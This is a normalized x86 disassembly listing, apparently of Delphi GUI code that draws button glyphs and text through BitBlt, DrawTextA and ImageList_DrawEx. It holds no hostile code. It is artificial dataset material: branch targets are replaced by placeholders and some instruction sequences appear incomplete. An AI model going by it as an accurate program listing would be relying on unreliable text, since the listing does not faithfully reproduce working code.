jne r-xdata
mov edx ebx
mov eax [ eax + 0x4 ]
call sub_41860c
mov eax ebx
call sub_403190
sub_431fa8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403160
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov esi eax
mov [ ebx + 0x4 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_4320dc
mov [ ebx + 0x1c ] 0x8080
mov [ ebx + 0x20 ] 0x1
xor eax eax
add esp 0xfffffff0
call sub_4034f4
xor edx edx
mov dl al
mov [ ebx + edx * 4 + 0xc ] 0xffffffff
inc eax
cmp al 0x4
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_431ea4
mov [ rw-data ] eax
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_43203c
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403190
mov eax esi
call sub_432098
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
mov eax [ rw-data ]
call sub_431f9c
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
mov eax [ rw-data ]
call sub_403190
xor eax eax
mov [ rw-data ] eax
sub_432098
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov [ esi + edi * 4 + 0xc ] 0xffffffff
inc ebx
cmp bl 0x4
jne r-xdata
mov edx eax
mov eax [ esi + 0x8 ]
call sub_431e74
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0xc ]
cmp eax 0xffffffff
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ rw-data ]
call sub_431f78
xor eax eax
mov [ esi + 0x8 ] eax
pop edi
pop esi
pop ebx
retn
sub_4320dc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
cmp edx esi
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_428c8c
mov [ ebx + 0x1c ] eax
mov eax ebx
call sub_432098
cmp [ ebx + 0x2a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_43210c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_432098
mov edx ebx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_428c8c
mov [ esi + 0x1c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
cmp eax 0x4
jle r-xdata
mov edx eax
mov eax esi
call sub_432184
mov eax 0x1
sub_432184
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jbe r-xdata
mov eax esi
call sub_432098
mov [ esi + 0x20 ] bl
mov edx [ esi + 0x4 ]
mov eax esi
call sub_4320dc
sub_4321ac
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov ebx [ edx + eax * 4 + 0xc ]
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x3
jae r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
or esi eax
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov esi eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43275b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push esi
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
xor edx edx
xor eax eax
call sub_416e34
mov eax [ ebp - 0xc ]
call sub_428ba0
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_42420c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
call sub_428368
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov bl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x20 ]
jl r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x38 ]
push eax
xor ecx ecx
mov cl bl
inc ecx
imul ecx edi
xor eax eax
mov al bl
imul edi
xor edx edx
call sub_416e34
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
xor ebx ebx
mov ecx esi
mov edx edi
mov eax [ rw-data ]
call sub_431f18
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_431ea4
mov [ rw-data ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_428ba0
push eax
mov eax [ ebp - 0xc ]
call sub_428ba0
lea edx [ ebp - 0x28 ]
pop ecx
call sub_42447c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x38 ] 0x1
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov ecx 0x20000000
mov edx [ ebp - 0xc ]
call sub_431e48
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_431e48
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_43271f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
jbe r-xdata
dec eax
sub al 0x2
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403190
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x14 ]
call sub_428ba0
mov eax [ eax + 0x14 ]
xor edx edx
call sub_42420c
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x14 ]
call sub_428c5c
test al al
je r-xdata
mov eax [ ebp - 0xc ]
call sub_428ba0
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_428ba0
mov ecx eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_42447c
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_429910
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x10 ]
call sub_428ba0
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_42420c
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_428ba0
push eax
mov eax [ ebp - 0x14 ]
call sub_428ba0
lea edx [ ebp - 0x28 ]
pop ecx
call sub_42447c
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000014
call sub_42420c
mov eax [ ebp - 0x18 ]
call sub_424a0c
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_428ba0
call sub_424a0c
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x10 ]
call sub_428ba0
mov eax [ eax + 0x14 ]
mov edx 0x808080
call sub_42420c
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_428ba0
push eax
mov eax [ ebp - 0x14 ]
call sub_428ba0
lea edx [ ebp - 0x28 ]
pop ecx
call sub_42447c
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000010
call sub_42420c
mov eax [ ebp - 0x18 ]
call sub_424a0c
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_428ba0
call sub_424a0c
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_423580
push eax
mov eax [ ebp - 0x10 ]
call sub_428ba0
mov eax [ eax + 0x14 ]
pop edx
call sub_42420c
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_428ba0
push eax
mov eax [ ebp - 0x14 ]
call sub_428ba0
lea edx [ ebp - 0x28 ]
pop ecx
call sub_42447c
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_42420c
mov eax [ ebp - 0x18 ]
call sub_424a0c
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_428ba0
call sub_424a0c
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_429910
mov eax [ ebp - 0xc ]
call sub_428ba0
mov ebx eax
mov eax [ ebx + 0x14 ]
mov edx 0xff00000f
call sub_42420c
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_4245b0
mov eax [ ebx + 0x14 ]
mov edx 0xff000014
call sub_42420c
push 0x0
mov eax ebx
call sub_424a0c
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_424a0c
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_428ba0
call sub_424a0c
push eax
push esi
push edi
push 0x1
push 0x1
mov eax ebx
call sub_424a0c
push eax
call BitBlt
mov eax [ ebx + 0x14 ]
mov edx 0xff000010
call sub_42420c
push 0x0
mov eax ebx
call sub_424a0c
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_424a0c
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_428ba0
call sub_424a0c
push eax
push esi
push edi
push 0x0
push 0x0
mov eax ebx
call sub_424a0c
push eax
call BitBlt
mov eax [ ebp - 0x14 ]
call sub_428ba0
mov eax [ eax + 0xc ]
mov edx 0xffffff
call sub_423a40
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_429910
mov eax [ ebp - 0x14 ]
call sub_428ba0
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_42420c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403190
mov eax [ ebp - 0x14 ]
call sub_403190
retn
sub_432784
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx [ ebp + 0xc ]
cmp [ edi + 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
je r-xdata
mov edx ebx
mov eax edi
call sub_4321ac
mov esi eax
call sub_43c850
call sub_43c930
test al al
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
xor edx edx
mov dl [ edi + 0x20 ]
mov ecx edx
cdq
idiv ecx
add eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
dec bl
je r-xdata
push 0x1
push 0x1fffffff
push 0x1fffffff
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_424a0c
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_45a690
push eax
call ImageList_DrawEx
jmp r-xdata
cmp bl 0x3
jne r-xdata
mov bl 0x5
jmp r-xdata
dec ebx
sub bl 0x2
jb r-xdata
push 0x0
push 0x1fffffff
mov eax 0xff00000f
call sub_423580
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_424a0c
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_45a690
push eax
call ImageList_DrawEx
call sub_43c850
lea ecx [ ebp - 0x14 ]
mov edx ebx
call sub_43cb94
lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi + 0x8 ]
call sub_45a690
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_424a0c
push eax
call sub_43c850
lea ecx [ ebp - 0x14 ]
pop edx
call sub_43ca80
jmp r-xdata
mov bl 0x4
jmp r-xdata
jmp r-xdata
mov bl 0x2
sub_4328e8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_424328
cmp [ ebp + 0xc ] 0x1
jne r-xdata
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_4041e0
push eax
mov eax esi
call sub_4043e0
push eax
mov eax ebx
call sub_424a0c
push eax
call DrawTextA
push 0x1
push 0x1
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000014
mov eax [ ebx + 0xc ]
call sub_423a40
mov eax edi
or eax 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_4041e0
push eax
mov eax esi
call sub_4043e0
push eax
mov eax ebx
call sub_424a0c
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ ebx + 0xc ]
call sub_423a40
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_4041e0
push eax
mov eax esi
call sub_4043e0
push eax
mov eax ebx
call sub_424a0c
push eax
call DrawTextA
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4329c8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
and eax 0x2
cmp eax 0x2
jne r-xdata
mov edx [ ebx + 0xc ]
sub edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
sub eax [ ebx ]
lea ecx [ ebp - 0x18 ]
call sub_416e0c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_416e0c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
lea ecx [ ebp - 0x20 ]
pop edx
call sub_416e0c
jmp r-xdata
cmp [ ebp + 0x1c ] 0x1
jne r-xdata
mov [ ebp + 0x1c ] 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x40 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_416e34
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea ecx [ ebp - 0x28 ]
xor edx edx
xor eax eax
call sub_416e0c
push 0x0
lea eax [ ebp - 0x40 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
xor edx edx
xor eax eax
call sub_416e34
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp + 0x8 ]
or eax 0x400
push eax
push edi
mov eax [ ebp + 0x20 ]
call sub_4041e0
push eax
mov eax [ ebp + 0x20 ]
call sub_4043e0
push eax
mov eax [ ebp - 0x8 ]
call sub_424a0c
push eax
call DrawTextA
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
sub eax [ edi ]
lea ecx [ ebp - 0x28 ]
call sub_416e0c
jmp r-xdata
mov eax [ ebp + 0x20 ]
call sub_4041e0
test eax eax
jle r-xdata
mov [ ebp + 0x1c ] 0x0
mov eax [ ebp - 0x18 ]
mov edx eax
sub edx [ ebp - 0x20 ]
inc edx
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
sub edx [ ebp - 0x1c ]
inc edx
sar edx 0x1
jns r-xdata
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov [ esi ] edx
sub eax [ ebp - 0x28 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ esi + 0x4 ] edx
sub eax [ ebp - 0x24 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ ebp - 0x10 ] eax
adc eax 0x0
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
xor eax eax
mov [ ebp + 0x14 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x18 ] 0xffffffff
jne r-xdata
mov al [ ebp + 0x1c ]
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
pop ecx
sub eax ecx
lea ecx [ ebp - 0x30 ]
call sub_416e0c
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp + 0x14 ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
add eax [ ebp - 0x28 ]
call sub_416e0c
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
call sub_416e0c
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi ] eax
add eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x24 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x28 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
add [ esi ] eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
add [ esi + 0x4 ] eax
call sub_43c850
call sub_43c930
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x20 ]
mov [ esi ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec al
je r-xdata
mov [ ebp + 0x14 ] eax
adc eax 0x0
mov [ ebp + 0x14 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
push eax
push edi
call OffsetRect
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
push eax
push edi
call OffsetRect
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi + 0x4 ] eax
add eax [ ebp - 0x1c ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp - 0x14 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x1c ]
mov [ esi + 0x4 ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_432cf4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x24 ]
mov eax [ ebp + 0x28 ]
push eax
push edi
mov al [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4329c8
mov al [ ebp + 0x14 ]
push eax
mov al [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_432784
mov eax [ ebp + 0x8 ]
push eax
mov al [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4328e8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_432d64
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44bed0
mov eax esi
mov edx [ r-xdata ]
call sub_403340
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_432d88
push ebx
mov ebx eax
mov eax ebx
call sub_4598b4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x172 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403340
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x20 ]
cmp al [ edx + 0x170 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_432dd4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x20 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403340
mov eax [ eax + 0x6c ]
cmp eax [ esi + 0x168 ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_432e04
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x20 ]
call sub_4336b4
sub_432e24
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_433740
sub_432e44
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_431fa8
mov [ ebx + 0x16c ] eax
mov eax [ ebx + 0x16c ]
mov [ eax + 0x2c ] ebx
mov [ eax + 0x28 ] sub_433674
mov ecx esi
xor edx edx
mov eax ebx
call sub_454cd0
push 0x17
push 0x16
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_44d2b8
mov edx 0xff00000f
mov eax ebx
call sub_44d32c
mov [ ebx + 0x174 ] 0x4
mov [ ebx + 0x17c ] 0xffffffff
mov [ ebx + 0x173 ] 0x0
mov [ ebx + 0x178 ] 0x1
inc [ rw-data ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_432f04
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
dec [ rw-data ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_454d2c
mov eax [ esi + 0x16c ]
call sub_403190
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_432f3c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x40 ] edx
